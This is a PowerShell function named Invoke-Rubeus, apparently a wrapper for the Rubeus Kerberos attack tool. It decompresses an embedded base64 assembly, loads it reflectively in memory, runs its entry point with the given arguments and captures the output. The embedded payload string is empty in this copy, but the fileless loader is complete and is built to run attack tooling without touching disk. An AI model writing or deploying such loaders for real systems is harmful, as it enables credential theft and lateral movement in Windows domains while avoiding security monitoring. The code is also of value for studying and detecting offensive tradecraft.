function Invoke-Rubeus {
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Command
    )

    $b = New-Object IO.MemoryStream(,[Convert]::FromBase64String(""))
    $decompressed = New-Object IO.Compression.GzipStream($b, [IO.Compression.CompressionMode]::Decompress)
    $out = New-Object System.IO.MemoryStream
    $decompressed.CopyTo($out)
    [byte[]] $byteOutArray = $out.ToArray()

    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    # Use the assembly entry point instead of hard-coding the type
    $entryPoint = $RAS.EntryPoint
    if (-not $entryPoint) {
        throw "Assembly has no entry point."
    }

    $params = @()
    if ($entryPoint.GetParameters().Count -gt 0) {
        # Main(string[] args)
        $params = ,([string[]]$Command.Split(" "))
    }

    $entryPoint.Invoke($null, $params)

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
